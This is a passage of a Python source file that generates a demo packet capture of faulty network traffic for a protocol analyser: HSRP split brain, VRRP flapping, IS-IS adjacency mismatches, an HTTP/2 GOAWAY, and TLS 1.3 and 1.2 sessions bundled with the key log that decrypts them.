        orig = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 60, 1, 0x4000, 1, 6, 0, _ip("10.0.1.19"), _ip("172.25.9.9")) + struct.pack("!HHI", 50200 + i, 443, 1)
        g.icmp(200.0 + i, "00:00:0c:04:00:01", GW_MAC, "10.40.0.%d" % (1 + i % 2), "10.0.1.19", 11, 0, body=orig)

    # 19. STP topology change ------------------------------------------------
    for i in range(3):
        bpdu = b"\x42\x42\x03" + b"\x00\x00\x00\x00" + b"\x01" + struct.pack("!H", 32768) + _mac("00:1a:2b:3c:4d:5e") + \
            struct.pack("!I", 4) + struct.pack("!H", 32768) + _mac("00:1a:2b:00:00:07") + b"\x80\x01" + b"\x00" * 8
        g.frames.append((T0 + 205.0 + i * 2, _mac("01:80:c2:00:00:00") + _mac("00:1a:2b:00:00:07") + struct.pack("!H", len(bpdu)) + bpdu))
    return g


def hsrp_v1(state, prio, group, vip, auth=b"cisco", op=0, hello=3, hold=10):
    return struct.pack("!BBBBBBBB", 0, op, state, hello, hold, prio, group, 0) + auth.ljust(8, b"\x00")[:8] + _ip(vip)


def vrrp_v2(vrid, prio, vip, interval=1):
    b = struct.pack("!BBBBBBH", 0x21, vrid, prio, 1, 0, interval, 0) + _ip(vip) + b"\x00" * 8
    return b[:6] + struct.pack("!H", _cks(b)) + b[8:]


def isis_lan_hello(level, sysid_hex, circuit, area_hex, neighbors=(), mtu=1497, hold=30, auth=None):
    hdr = bytes([0x83, 27, 1, 0, 15 if level == 1 else 16, 1, 0, 0])
    sid = bytes.fromhex(sysid_hex)
    tlvs = b""
    area = bytes.fromhex(area_hex)
    tlvs += bytes([1, len(area) + 1, len(area)]) + area
    if neighbors:
        nb = b"".join(_mac(m) for m in neighbors)
        tlvs += bytes([6, len(nb)]) + nb
    if auth:
        tlvs += bytes([10, len(auth) + 1, 1]) + auth
    body_len = 27 + len(tlvs)
    pad = b""
    while body_len + len(pad) < mtu:
        n = min(255, mtu - body_len - len(pad) - 2)
        if n < 0:
            break
        pad += bytes([8, n]) + b"\x00" * n
    pdu = hdr + bytes([circuit]) + sid + struct.pack("!HH", hold, mtu) + bytes([64]) + sid + b"\x01" + tlvs + pad
    return pdu


def llc_frame(src, dst, payload, vlan=None):
    body = b"\xfe\xfe\x03" + payload
    hdr = _mac(dst) + _mac(src)
    if vlan is not None:
        hdr += struct.pack("!HH", 0x8100, vlan)
    return hdr + struct.pack("!H", len(body)) + body


def build_extended(g: "Gen") -> None:
    """HSRP split brain, VRRP flapping, IS-IS adjacency faults and HTTP/2 errors."""
    r1, r2 = "00:00:0c:07:ac:01", "00:00:0c:07:ac:02"
    for i in range(6):                         # HSRP group 10: both routers claim Active (auth differs)
        tt = 230.0 + i * 3
        g.udp(tt, r1, "01:00:5e:00:00:02", "10.50.0.2", "224.0.0.2", 1985, 1985, hsrp_v1(16, 110, 10, "10.50.0.1"), ttl=1)
        g.udp(tt + 1.5, r2, "01:00:5e:00:00:02", "10.50.0.3", "224.0.0.2", 1985, 1985,
              hsrp_v1(16, 100, 10, "10.50.0.1", auth=b"s3cret"), ttl=1)
    v1, v2 = "00:00:5e:00:01:14", "00:00:5e:00:01:15"
    for i, (mac, src, prio) in enumerate([(v1, "10.60.0.2", 120), (v2, "10.60.0.3", 100), (v1, "10.60.0.2", 120),
                                          (v2, "10.60.0.3", 100), (v1, "10.60.0.2", 120)]):
        for k in range(3):                     # VRRP group 20: master keeps changing
            g.ipv4(250.0 + i * 5 + k, mac, "01:00:5e:00:00:12", src, "224.0.0.18", 112, vrrp_v2(20, prio, "10.60.0.1"), ttl=255)
    a, b = "00:00:0c:15:00:01", "00:00:0c:15:00:02"
    c3, c4 = "00:00:0c:15:00:03", "00:00:0c:15:00:04"
    for i in range(3):                         # IS-IS VLAN 100: MTU mismatch + one-way; VLAN 200: circuit type mismatch
        tt = 280.0 + i * 10
        g.frames.append((T0 + tt, llc_frame(a, "01:80:c2:00:00:15", isis_lan_hello(2, "000000000001", 3, "490001", [], mtu=1497), 100)))
        g.frames.append((T0 + tt + 1, llc_frame(b, "01:80:c2:00:00:15", isis_lan_hello(2, "000000000002", 3, "490001", [a], mtu=1397), 100)))
        g.frames.append((T0 + tt + 2, llc_frame(c3, "01:80:c2:00:00:14", isis_lan_hello(1, "000000000003", 1, "490002", mtu=600), 200)))
        g.frames.append((T0 + tt + 3, llc_frame(c4, "01:80:c2:00:00:15", isis_lan_hello(2, "000000000004", 2, "490003", mtu=600), 200)))
    try:                                        # HTTP/2 (h2c) with a 503 and GOAWAY ENHANCE_YOUR_CALM
        import h2.config
        import h2.connection
        import h2.errors
    except ImportError:
        return
    cli = h2.connection.H2Connection(h2.config.H2Configuration(client_side=True))
    srv = h2.connection.H2Connection(h2.config.H2Configuration(client_side=False))
    cli.initiate_connection()
    for path in ("/api/items", "/api/checkout"):
        cli.send_headers(cli.get_next_available_stream_id(), [(":method", "GET"), (":path", path), (":authority", "shop.example"),
                                                              (":scheme", "http"), ("user-agent", "demo-h2")], end_stream=True)
    c2s = cli.data_to_send()
    srv.initiate_connection()
    srv.receive_data(c2s)
    srv.send_headers(1, [(":status", "200")])
    srv.send_data(1, b"{}" * 700, end_stream=True)
    srv.send_headers(3, [(":status", "503")], end_stream=True)
    srv.close_connection(error_code=h2.errors.ErrorCodes.ENHANCE_YOUR_CALM, additional_data=b"too many streams")
    s2c = srv.data_to_send()
    c = Conv(g, "00:50:56:00:01:20", GW_MAC, "10.0.1.20", "10.0.2.60", 50020, 8080, ttl_s=63)
    t = c.handshake(300.0, rtt_s=0.002)
    half = len(c2s) // 2 + 5                  # request split mid-frame across two segments
    c.c(t + 0.001, 0x18, c2s[:half])
    c.c(t + 0.002, 0x18, c2s[half:])
    c.s(t + 0.040, 0x18, s2c[:900])
    c.s(t + 0.041, 0x18, s2c[900:])
    c.c(t + 0.042, 0x10)


# ------------------------------------------------------- TLS encryption ----
def tls13_record(secret: bytes, seq: int, inner: int, plaintext: bytes, hname="sha256", klen=16) -> bytes:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from .tlsdecrypt import _xor_nonce, hkdf_expand_label
    key = hkdf_expand_label(hname, secret, "key", b"", klen)
    iv = hkdf_expand_label(hname, secret, "iv", b"", 12)
    body = plaintext + bytes([inner])
    hdr = struct.pack("!BHH", 23, 0x0303, len(body) + 16)
    return hdr + AESGCM(key).encrypt(_xor_nonce(iv, seq), body, hdr)


def tls12_keys(master: bytes, client_random: bytes, server_random: bytes, klen=16):
    from .tlsdecrypt import prf12
    kb = prf12("sha256", master, b"key expansion", server_random + client_random, 2 * klen + 8)
    return (kb[:klen], kb[2 * klen:2 * klen + 4]), (kb[klen:2 * klen], kb[2 * klen + 4:])


def tls12_record(keys, seq: int, ctype: int, plaintext: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    key, salt = keys
    explicit = seq.to_bytes(8, "big")
    aad = struct.pack("!QBHH", seq, ctype, 0x0303, len(plaintext))
    frag = explicit + AESGCM(key).encrypt(salt + explicit, plaintext, aad)
    return struct.pack("!BHH", ctype, 0x0303, len(frag)) + frag


def build_tls_decryptable(g: "Gen", t0: float = 320.0) -> str:
    """One TLS 1.3 and one TLS 1.2 HTTPS session plus the NSS key log that decrypts them."""
    import os
    try:
        import cryptography  # noqa: F401
        from .tlsdecrypt import HAVE_CRYPTO
        if not HAVE_CRYPTO:
            return ""
    except BaseException:
        return ""
    lines = []
    # --- TLS 1.3 (TLS_AES_128_GCM_SHA256): a 502 hidden inside HTTPS
    cr, sr = os.urandom(32), os.urandom(32)
    sec = {k: os.urandom(32) for k in ("CLIENT_HANDSHAKE_TRAFFIC_SECRET", "SERVER_HANDSHAKE_TRAFFIC_SECRET",
                                       "CLIENT_TRAFFIC_SECRET_0", "SERVER_TRAFFIC_SECRET_0")}
    lines += [f"{k} {cr.hex()} {v.hex()}" for k, v in sec.items()]
    c = Conv(g, "00:50:56:00:01:21", GW_MAC, "10.0.1.21", "203.0.113.30", 50030, 443, ttl_s=54)
    t = c.handshake(t0, rtt_s=0.020)
    c.c(t + 0.001, 0x18, client_hello("api.secure.example", 0x0303, (0x1301,), sup_versions=[0x0304], random=cr))
    c.s(t + 0.022, 0x18, server_hello(0x0303, 0x1301, tls13=True, random=sr)
        + tls13_record(sec["SERVER_HANDSHAKE_TRAFFIC_SECRET"], 0, 22, b"\x08\x00\x00\x02\x00\x00")
        + tls13_record(sec["SERVER_HANDSHAKE_TRAFFIC_SECRET"], 1, 22, b"\x14\x00\x00\x20" + b"f" * 32))
    c.c(t + 0.023, 0x18, tls13_record(sec["CLIENT_HANDSHAKE_TRAFFIC_SECRET"], 0, 22, b"\x14\x00\x00\x20" + b"c" * 32)
        + tls13_record(sec["CLIENT_TRAFFIC_SECRET_0"], 0, 23,
                       http_req("GET", "api.secure.example", "/v2/orders?id=42", extra="Authorization: Bearer abc123\r\n")))
    body = b"<h1>502 Bad Gateway</h1>upstream connect error"
    c.s(t + 0.300, 0x18, tls13_record(sec["SERVER_TRAFFIC_SECRET_0"], 0, 23, http_resp(502, "Bad Gateway", body)))
    c.c(t + 0.301, 0x10)
    c.close(t + 0.4)
    # --- TLS 1.2 (ECDHE-RSA-AES128-GCM-SHA256)
    cr, sr, master = os.urandom(32), os.urandom(32), os.urandom(48)
    lines.append(f"CLIENT_RANDOM {cr.hex()} {master.hex()}")
    ck, sk = tls12_keys(master, cr, sr)
    c = Conv(g, "00:50:56:00:01:21", GW_MAC, "10.0.1.21", "203.0.113.31", 50031, 443, ttl_s=54)
    t = c.handshake(t0 + 2, rtt_s=0.020)
    c.c(t + 0.001, 0x18, client_hello("shop.secure.example", 0x0303, (0xC02F,), random=cr))
    c.s(t + 0.022, 0x18, server_hello(0x0303, 0xC02F, random=sr))
    ccs = struct.pack("!BHHB", 20, 0x0303, 1, 1)
    c.c(t + 0.024, 0x18, ccs + tls12_record(ck, 0, 22, b"\x14\x00\x00\x0c" + b"c" * 12))
    c.s(t + 0.045, 0x18, ccs + tls12_record(sk, 0, 22, b"\x14\x00\x00\x0c" + b"s" * 12))
    req = http_req("POST", "shop.secure.example", "/cart/checkout")
    c.c(t + 0.046, 0x18, tls12_record(ck, 1, 23, req[:30]))          # request split over two records
    c.c(t + 0.047, 0x18, tls12_record(ck, 2, 23, req[30:]))
    c.s(t + 0.070, 0x18, tls12_record(sk, 1, 23, http_resp(200, "OK", b'{"ok":true}', "application/json")))
    c.c(t + 0.071, 0x10)
    c.close(t + 0.2)
    return "\n".join(lines) + "\n"


def write_demo(path: str, fmt: str = "pcapng") -> int:
    g = build_demo()
    build_extended(g)
    keylog = build_tls_decryptable(g)        # keys embedded in the pcapng (Decryption Secrets Block)
    return g.save(path, fmt, keylog=keylog or None)
